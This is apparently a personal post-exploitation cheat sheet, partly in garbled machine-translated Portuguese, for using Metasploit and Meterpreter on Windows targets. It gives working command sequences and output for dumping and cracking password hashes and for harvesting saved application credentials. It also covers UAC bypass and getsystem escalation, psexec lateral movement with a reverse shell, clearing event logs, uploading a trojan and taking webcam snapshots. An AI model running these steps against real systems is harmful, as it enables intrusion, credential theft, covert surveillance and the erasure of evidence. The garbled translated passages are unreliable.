+[*] Time: 2011-05-18 02:02:08 UTC Credential: host=192.168.1.234 port=445 proto=tcp sname=smb type=smb_hash user=Administrator pass=aad3b435b51404eeaad3b435b51404ee:d208bd92b52f7cb48eb64c53dbd34552 active=true
+
+[*] Time: 2011-05-18 02:03:40 UTC Credential: host=192.168.1.224 port=445 proto=tcp sname=smb type=smb_hash user=adminuser pass=aad3b435b51404eeaad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203 active=true
+
+[*] Time: 2011-05-18 02:03:40 UTC Credential: host=192.168.1.224 port=445 proto=tcp sname=smb type=smb_hash user=Administrator pass=aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 active=true
+
+[*] Time: 2011-05-18 02:06:15 UTC Credential: host=192.168.1.113 port=445 proto=tcp sname=smb type=smb_hash user=HelpAssistant pass=17520fb9c159a6be8a692d4f186288a5:4ad260d25ad790417f1a4ef3c44103b2 active=true
+
+[*] Time: 2011-05-18 02:06:15 UTC Credential: host=192.168.1.113 port=445 proto=tcp sname=smb type=smb_hash user=Administrator pass=bbc1afce0ca1e5eee694e8a550e822f3:7a118f7a2f2b34d61fa19b840b4f5203 active=true
+
+[*] Time: 2011-05-18 02:06:15 UTC Credential: host=192.168.1.113 port=445 proto=tcp sname=smb type=smb_hash user=SUPPORT_388945a0 pass=aad3b435b51404eeaad3b435b51404ee:ec48ef68e471506ab31f656bf5741d63 active=true
+
+[*] Found 9 credentials
+
+.
+Se você quiser usar esses hashes no PSEXEC e para rachar, lembre-se de filtrar as contas Guest, SUPPORT_ * e HelpAssistant, pois normalmente eles estão desativados. No controlador de domínio, a conta com o nome do host $ é a conta de recuperação do Active Directory muitas vezes o mesmo que a Conta de administrador do domínio e não pode ser usada remotamente.
+
+Eu incluí a criação de um arquivo de pilhagem com os hashes por 2 razões
+
+    Ele salva o SID da conta para identificar as contas e poder usar essas, se necessário.
+    Algumas vezes você não possui um banco de dados anexado ou exclua um espaço de trabalho por acidente.
+
+---------------------------------
+
+Encerramento de privilégios de recolher o Windows
+
+Este módulo será impresso se o UAC estiver ativado e se a conta atual for habilitada para ADMIN. Ele também imprimirá o UID, o primeiro SESSION ID, o status do SISTEMA e os PRIVILEGES do processo atual
+
+
+ msf > use post/windows/gather/win_privs
+      msf post(win_privs) > sessions
+            ...sessions...
+      msf post(win_privs) > set SESSION <session-id>
+      msf post(win_privs) > show options
+            ...show and set options...
+      msf post(win_privs) > run
+------------------------------------
+Windows Gerenciar módulo de injeção de carga útil de memória
+
+Este módulo irá injetar na memória de um processo uma carga útil especificada do Windows. Se uma carga útil ou um processo não for fornecido, um será criado por padrão usando uma carga útil reversa de xtremo TCP x86.
+
+msf > use post/windows/manage/payload_inject
+      msf post(payload_inject) > sessions
+            ...sessions...
+      msf post(payload_inject) > set SESSION <session-id>
+      msf post(payload_inject) > show options
+            ...show and set options...
+      msf post(payload_inject) > run
+-----------------------------------------
+
+Windows Gerenciar Injeção de Arquivos de Hosts
+
+Este módulo permite que o invasor insira uma nova entrada no arquivo de hosts do sistema de destino.
+
+ msf > use post/windows/manage/inject_host
+      msf post(inject_host) > sessions
+            ...sessions...
+      msf post(inject_host) > set SESSION <session-id>
+      msf post(inject_host) > show options
+            ...show and set options...
+      msf post(inject_host) > run
+-------------------------------
+Windows agrupa as senhas salvas de preferências da preferência de grupo
+
+Este módulo enumera o controlador de domínio da máquina vítima e se conecta via SMB. Em seguida, ele busca arquivos de preferência de preferência de diretiva de grupo contendo contas de usuário local e senhas e desencriptá-los usando a chave pública AES do Microsofts. Os arquivos de política de grupo em cache podem ser encontrados em dispositivos de usuário final se o objeto de política de grupo for excluído em vez de desvinculado. Testado no WinXP SP3 Client e Win2k8 R2 DC.
+
+ msf > use post/windows/gather/credentials/gpp
+      msf post(gpp) > sessions
+            ...sessions...
+      msf post(gpp) > set SESSION <session-id>
+      msf post(gpp) > show options
+            ...show and set options...
+      msf post(gpp) > run
+------------------------------------------
+Coletor de credenciais de recolha do Windows
+
+Este módulo colhe as credenciais encontradas no host e as armazena no banco de dados.
+
+
+msf > use post/windows/gather/credentials/credential_collector
+      msf post(credential_collector) > sessions
+            ...sessions...
+      msf post(credential_collector) > set SESSION <session-id>
+      msf post(credential_collector) > show options
+            ...show and set options...
+      msf post(credential_collector) > run
+-----------------------------------------------
+multi post
+
+msf > use post/multi/manage/multi_post 
+msf  post(multi_post) > info
+
+msf  post(multi_post) > show options 
+
+Module options (post/multi/manage/multi_post):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   MACRO                     yes       File with Post Modules and Options to run in the session
+   SESSION                   yes       The session to run this module on.
+
+Como podemos ver, é necessário um arquivo de macro onde cada módulo de publicação e suas opções são escritas uma por linha no formato de <módulo> 
+<opt = val, opt = val> permite criar uma macro para executar todas as credenciais de dumping da senha. A Macro seria algo assim:
+
+post/windows/gather/credentials/wsftp_client
+post/windows/gather/credentials/winscp
+post/windows/gather/credentials/windows_autologin
+post/windows/gather/credentials/vnc
+post/windows/gather/credentials/trillian
+post/windows/gather/credentials/total_commander
+post/windows/gather/credentials/smartftp
+post/windows/gather/credentials/outlook
+post/windows/gather/credentials/nimbuzz
+post/windows/gather/credentials/mremote
+post/windows/gather/credentials/imail
+post/windows/gather/credentials/idm
+post/windows/gather/credentials/flashfxp
+post/windows/gather/credentials/filezilla_server
+post/windows/gather/credentials/meebo
+post/windows/gather/credentials/coreftp
+post/windows/gather/credentials/imvu
+post/windows/gather/credentials/epo_sql
+post/windows/gather/enum_ie
+post/multi/gather/ssh_creds
+post/multi/gather/pidgin_cred
+post/multi/gather/firefox_creds
+post/multi/gather/filezilla_client_cred
+
+
+Agora, salvamos o arquivo como cred_dump.rc e podemos usá-lo no módulo:
+
+msf  post(multi_post) > set MACRO /Users/carlos/cred_dump.rc
+ACRO => /Users/carlos/cred_dump.rc
+msf  post(multi_post) > set SESSION 1
+SESSION => 1
+msf  post(multi_post) > run
+
+[*] Running module against WIN2K8R2-01
+Loading post/windows/gather/credentials/wsftp_client
+Running Against 1
+[*] Checking Default Locations...
+[*] C:\Users\Administrator\AppData\Roaming\Ipswitch\WS_FTP\Sites\ws_ftp.ini not found ....
+[*] C:\Users\Administrator\AppData\Roaming\Ipswitch\WS_FTP Home\Sites\ws_ftp.ini not found ....
+Loading post/windows/gather/credentials/winscp
+Running Against 1
+[*] Looking for WinSCP.ini file storage...
+[*] WinSCP.ini file NOT found...
+[*] Looking for Registry Storage...
+[*] No WinSCP Registry Keys found!
+[*] Done!
+Loading post/windows/gather/credentials/windows_autologin
+Running Against 1
+[*] Running against WIN2K8R2-01 on session 1
+[-] Post failed: NameError undefined local variable or method `d02' for #<#<Module:0x007fc88b0c0e78>::Metasploit3:0x007fc88fd80898>
+[-] Call stack:
+[-]   /Users/carlos/Development/msf4/modules/post/windows/gather/credentials/windows_autologin.rb:95:in `run'
+Loading post/windows/gather/credentials/vnc
+Running Against 1
+[*] Enumerating VNC passwords on WIN2K8R2-01
+[*] Checking UltraVNC...
+[*] Checking WinVNC3_HKLM...
+[*] Checking WinVNC3_HKCU...
+[*] Checking WinVNC3_HKLM_Default...
+[*] Checking WinVNC3_HKCU_Default...
+[*] Checking WinVNC_HKLM_Default...
+[*] Checking WinVNC_HKCU_Default...
+[*] Checking WinVNC4_HKLM...
+[*] Checking WinVNC4_HKCU...
+[*] Checking RealVNC_HKLM...
+[*] Checking RealVNC_HKCU...
+[*] Checking TightVNC_HKLM...
+[*] Checking TightVNC_HKLM_Control_pass...
+[*] Checking RealVNC_S-1-5-21-3759490038-1939265364-4245280780-500...
+[*] Checking WinVNC4_S-1-5-21-3759490038-1939265364-4245280780-500...
+[*] Checking WinVNC_S-1-5-21-3759490038-1939265364-4245280780-500_Default...
+[*] Checking WinVNC3_S-1-5-21-3759490038-1939265364-4245280780-500_Default...
+[*] Checking WinVNC3_S-1-5-21-3759490038-1939265364-4245280780-500...
+
+. . . . . .
+
+[*] Checking for Firefox directory in: C:\Users\Administrator\AppData\Roaming\Mozilla\
+[-] Firefox not found
+Loading post/multi/gather/filezilla_client_cred
+Running Against 1
+[*] Checking for Filezilla directory in: C:\Users\Administrator\AppData\Roaming
+[*] No users found with a FileZilla directory
+[*] Post module execution completed
+msf  post(multi_post) >
+--------------------------------------
+
+Às vezes, quando você tenta explorar um buraco de segurança e o sucesso obtém acesso ao sistema de destino, geralmente você atua como usuário registrado e não é uma conta de sistema local. Nestas dicas e truques, há um passo simples para escalar seu privilégio quando você estiver dentro do meterpreter.
+Esta imagem abaixo é tomada quando hackeada com sucesso obtém um acesso usando Payload criado
+ 
+#meterpreter> getuid
+
+Ao executar o comando getuid, sabemos que estamos funcionando como usuários que já iniciaram sessão no sistema, mas não agimos como conta do sistema. Como fazemos isso para escalar nosso privilégio para a conta do sistema?
+
+A sessão tem apenas direitos de usuário limitados. Isso pode limitar severamente as ações que você pode executar no sistema remoto, como o dumping de senhas, a manipulação do registro, a instalação de portas traseiras, etc.
+
+Felizmente, o Metasploit possui um script do Meterpreter, "sistema de sistema", que usará várias técnicas diferentes para tentar obter privilégios de nível SYSTEM no sistema remoto. Há também várias outras façanhas (locais) que podem ser usadas para escalar privilégios também.
+
+#meterpreter> use priv
+# #meterpreter> sistema de instalação
+
+faça uso do comando 'getsystem', se não estiver carregado, precisamos primeiro carregar a extensão 'priv'.
+ 
+Vamos deixar o Metasploit tentar fazer o levantamento pesado para nós executando o "sistema de disposição" 
+sem quaisquer opções. O script tentará cada método disponível para ele, parando quando ele for bem-sucedido.
+
+Existem situações em que o sistema misto falha dependendo do sistema operacional e do método de exploração que estamos usando.
+
+Nesta imagem acima, estamos apenas acessando a conta de usuário do sistema normal com menos privilégios, executando o comando 
+
+post / windows / gather / win_privs,
+
+listará o privilégio dos usuários atuais logados.
+Para este tutorial, estamos explorando o Windows 7 como máquina de uma vítima e executando um comando sysinfo no seu contêiner de medidor você receberá informações sobre seu sistema de exploração.
+
+#meterpreter> sysinfo
+#meterpreter> run post / windows / gather / win_privs
+
+Se o código do sistema de sistema detectar que ele está sendo executado em um Windows 7 com UAC desativado e ele está sendo executado como administrador local, ele executará o sistema de conserto e ele usará o método de registro de leitura,
+Quando executamos o comando getsystem, ele falhará porque o usuário registrado atual não tem privilégio suficiente para obter funções de 
+administrador e particularmente no Windows 7 O UAC está habilitado para o padrão.
+
+Então, primeiro tentamos contornar o UAC habilitado no Windows 7. Por sorte, temos o Windows UAC bypass exploit em metasploit.
+Meterpreter em Kali já não reconheceu "run bypassuac", em vez disso, 
+temos o ultimo item da lista:
+
+getuid
+
+getsystem
+os anteriores podem falhar
+mas o proximo nao:
+
+run post/windows/gather/win_privs
+
+ver se esta rodando uac 
+
+sysinfo
+
+background
+
+neste caso eh para o bypass no uac.. mas se vc quiser buscar coisas no metasploit use:
+
+search  uac
+
+use exploit/windows/local/bypassuac.
+
+set   LHOST 
+set   LPORT
+sessions -i
+
+set   SESSION numero
+
+apos tudo dar certo 
+
+getsystem (-t 1)
+
+getuid
+
+verificar se esta como autoridade nt vc como usuario.
+
+run post/windows/gather/win_privs
+
+
+cache dump
+
+run post/windows/gather/cachedump
+cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot
+ 
+meterpreter > background
+    msf exploit(handler) > route add 10.10.10.0 255.255.255.0 1
+    msf exploit(handler) > use exploit/windows/smb/psexec
+    msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+    PAYLOAD => windows/meterpreter/reverse_tcp
+    msf exploit(psexec) > set LHOST X.X.X.X
+    LHOST => X.X.X.X
+    msf exploit(psexec) > set LPORT 80
+    LPORT => 80
+    msf exploit(psexec) > set SMBDomain Contoso
+
+    SMBDomain => Contoso
+    msf exploit(psexec) > set SMBUser jdoe
+    SMBUser => jdoe
+    msf exploit(psexec) > set SMBPass ASDqwe123
+    SMBPass => ASDqwe123
+    msf exploit(psexec) > show options
+
+
+Module options (exploit/windows/smb/psexec):
+
+       Name       Current Setting  Required  Description
+       ----       ---------------  --------  -----------
+       RHOST                       yes       The target address
+       RPORT      445              yes       Set the SMB service port
+       SMBDomain  Contoso          no        The Windows domain to use for authentication
+       SMBPass    ASDqwe123        no        The password for the specified username
+       SMBUser    jdoe             no        The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  process          yes       Exit technique: seh, thread, none, process
+       LHOST     X.X.X.X  yes       The listen address
+       LPORT     80               yes       The listen port
+
+Exploit target:
+
+       Id  Name
+       --  ----
+       0   Automatic
+
+    msf exploit(psexec) > set RHOST 10.10.10.200
+    RHOST => 10.10.10.200
+    msf exploit(psexec) > exploit
+
+    [*] Started reverse handler on X.X.X.X:80
+    [*] Connecting to the server...
+    [*] Authenticating to 10.10.10.200:445|Contoso as user 'jdoe'...
+    [*] Uploading payload...
+    [*] Created \jSlxARUj.exe...
+    [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[\svcctl] ...
+    [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[\svcctl] ...
+    [*] Obtaining a service manager handle...
+    [*] Creating a new service (SyHtwKpn - "MbEXNupOpYUL")...
+    [*] Closing service handle...
+    [*] Opening service...
+    [*] Starting the service...
+    [*] Removing the service...
+    [*] Closing service handle...
+    [*] Deleting \jSlxARUj.exe...
+    [*] Meterpreter session 2 opened (X.X.X.X:80 -> X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
+
+
+
+COMANDOS COMUNS USAGE:
+
+
+help
+
+The ‘help‘ command, as may be expected, displays the Meterpreter help menu.
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    background    Backgrounds the current session
+    channel       Displays information about active channels
+...snip...
+
+ 
+background
+
+The ‘background‘ command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.
+
+meterpreter > background
+msf exploit(ms08_067_netapi) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter >
+
+ 
+cat
+
+The ‘cat‘ command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.
+
+meterpreter > cat
+Usage: cat file
+
+Example usage:
+meterpreter > cat edit.txt
+What you talkin' about Willis
+
+meterpreter >
+
+ 
+cd > pwd
+
+The ‘cd‘ > ‘pwd‘ commands are used to change and display current working directly on the target host.
+The change directory “cd” works the same way as it does under DOS and *nix systems.
+By default, the current working folder is where the connection to your listener was initiated.
+
+ARGUMENTS:
+
+cd:	Path of the folder to change to
+pwd:	None required
+
+Example usuage:
+
+meterpreter > pwd
+c:\
+meterpreter > cd c:\windows
+meterpreter > pwd
+c:\windows
+meterpreter >
+
+ 
+clearev
+
+The ‘clearev‘ command will clear the Application, System, and Security logs on a Windows system. There are no options or arguments.
+Before using Meterpreter to clear the logs | Metasploit Unleashed
+
+Before using Meterpreter to clear the logs | Metasploit Unleashed
+
+Example usage:
+Before
+
+meterpreter > clearev
+[*] Wiping 97 records from Application...
+[*] Wiping 415 records from System...
+[*] Wiping 0 records from Security...
+meterpreter >
+
+After using Meterpreter to clear the logs | Metasploit Unleashed
+
+After using Meterpreter to clear the logs | Metasploit Unleashed
+
+After
+download
+
+The ‘download‘ command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.
+
+meterpreter > download c:\\boot.ini
+[*] downloading: c:\boot.ini -> c:\boot.ini
+[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
+meterpreter >
+
+ 
+edit
+
+The ‘edit‘ command opens a file located on the target host.
+It uses the ‘vim’ so all the editor’s commands are available.
+
+Example usage:
+
+meterpreter > ls
+
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+.
+...snip...
+.
+100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
+
+meterpreter > edit edit.txt
+
+ 
+
+Please refer to the vim editor documentation for more advance use.
+http://www.vim.org/
+execute
+
+The ‘execute‘ command runs a command on the target.
+
+meterpreter > execute -f cmd.exe -i -H
+Process 38320 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+ 
+getuid
+
+Running ‘getuid‘ will display the user that the Meterpreter server is running as on the host.
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+
+ 
+hashdump
+
+The ‘hashdump‘ post module will dump the contents of the SAM database.
+
+meterpreter > run post/windows/gather/hashdump 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hashes...
+
+Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
+dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
+victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+meterpreter >
+
+ 
+idletime
+
+Running ‘idletime‘ will display the number of seconds that the user at the remote machine has been idle.
+
+meterpreter > idletime
+User has been idle for: 5 hours 26 mins 35 secs
+meterpreter >
+
+ 
+ipconfig
+
+The ‘ipconfig‘ command displays the network interfaces and addresses on the remote machine.
+
+meterpreter > ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC: 00:0c:29:10:f5:15
+IP Address  : 192.168.1.104
+Netmask     : 255.255.0.0
+
+meterpreter >
+
+ 
+lpwd > lcd
+
+The ‘lpwd‘ > ‘lcd‘ commands are used to display and change the local working directory respectively.
+When receiving a Meterpreter shell, the local working directory is the location where one started the Metasploit console.
+Changing the working directory will give your Meterpreter session access to files located in this folder.
+
+ARGUMENTS:
+
+lpwd:		None required
+lcd:		Destination folder
+
+Example usage:
+
+meterpreter > lpwd
+/root
+
+meterpreter > lcd MSFU
+meterpreter > lpwd
+/root/MSFU
+
+meterpreter > lcd /var/www
+meterpreter > lpwd
+/var/www
+meterpreter >
+
+ 
+ls
+
+As in Linux, the ‘ls‘ command will list the files in the current remote directory.
+
+meterpreter > ls
+
+Listing: C:\Documents and Settings\victim
+=========================================
+
+Mode              Size     Type  Last modified                   Name
+----              ----     ----  -------------                   ----
+40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
+40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
+100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
+40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
+...snip...
+
+ 
+
+ 
+migrate
+
+Using the ‘migrate‘ post module, you can migrate to another process on the victim.
+
+meterpreter > run post/windows/manage/migrate
+
+[*] Running module against V-MAC-XP
+[*] Current server process: svchost.exe (1076)
+[*] Migrating to explorer.exe...
+[*] Migrating into process ID 816
+[*] New server process: Explorer.EXE (816)
+meterpreter >
+
+ 
+ps
+
+The ‘ps‘ command displays a list of running processes on the target.
+
+meterpreter > ps
+
+Process list
+============
+
+    PID   Name                  Path
+    ---   ----                  ----
+    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
+...snip...
+
+ 
+resource
+
+The ‘resource‘ command will execute Meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.
+
+By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
+
+meterpreter > resource 
+Usage: resource path1 path2Run the commands stored in the supplied files.
+meterpreter >
+
+ARGUMENTS:
+
+path1:		The location of the file containing the commands to run.
+Path2Run:	The location where to run the commands found inside the file
+
+Example usage
+Our file used by resource:
+
+root@kali:~# cat resource.txt
+ls
+background
+root@kali:~#
+
+Running resource command:
+
+meterpreter> > resource resource.txt
+[*] Reading /root/resource.txt
+[*] Running ls
+
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
+40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
+100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
+100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
+100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
+100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk
+
+[*] Running background
+
+[*] Backgrounding session 1...
+msf  exploit(handler) >
+
+ 
+search
+
+The ‘search‘ commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.
+Wildcards can also be used when creating the file pattern to search for.
+
+meterpreter > search
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+
+ARGUMENTS:
+
+File pattern:	 	May contain wildcards
+Search location:	Optional, if none is given the whole system will be searched.
+
+Example usage:
+
+meterpreter > search -f autoexec.bat
+Found 1 result...
+    c:\AUTOEXEC.BAT
+meterpreter > search -f sea*.bat c:\\xamp\\
+Found 1 result...
+    c:\\xampp\perl\bin\search.bat (57035 bytes)
+meterpreter >
+
+ 
+shell
+
+The ‘shell‘ command will present you with a standard shell on the target system.
+
+meterpreter > shell
+Process 39640 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+ 
+upload
+
+As with the ‘download‘ command, you need to use double-slashes with the upload command.
+
+meterpreter > upload evil_trojan.exe c:\\windows\\system32
+[*] uploading  : evil_trojan.exe -> c:\windows\system32
+[*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
+meterpreter >
+
+ 
+webcam_list
+
+The ‘webcam_list‘ command when run from the Meterpreter shell, will display currently available web cams on the target host.
+
+Example usage:
+
+meterpreter > webcam_list
+1: Creative WebCam NX Pro
+2: Creative WebCam NX Pro (VFW)
+meterpreter >
+
+ 
+webcam_snap
+
+The ‘webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.
+
+meterpreter > webcam_snap -h
+Usage: webcam_snap [options]
+Grab a frame from the specified webcam.
+
+OPTIONS:
+
+    -h      Help Banner
+    -i >opt>  The index of the webcam to use (Default: 1)
+    -p >opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
+    -q >opt>  The JPEG image quality (Default: '50')
+    -v >opt>  Automatically view the JPEG image (Default: 'true')
+
+meterpreter >
+
+OPTIONS:
+
+-h:	Displays the help information for the command
+-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
+        image from
+-p opt:	Change path and filename of the image to be saved
+-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
+-v opt:	By default the value is true, which opens the image after capture.
+
+ 
+
+Example usage:
+
+meterpreter > webcam_snap -i 1 -v false
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
+meterpreter >
+
+Using webcam_snap Meterpreter plugin | Metasploit Unleashed
+
+Using webcam_snap Meterpreter plugin | Metasploit Unleashed
+
+
+
+
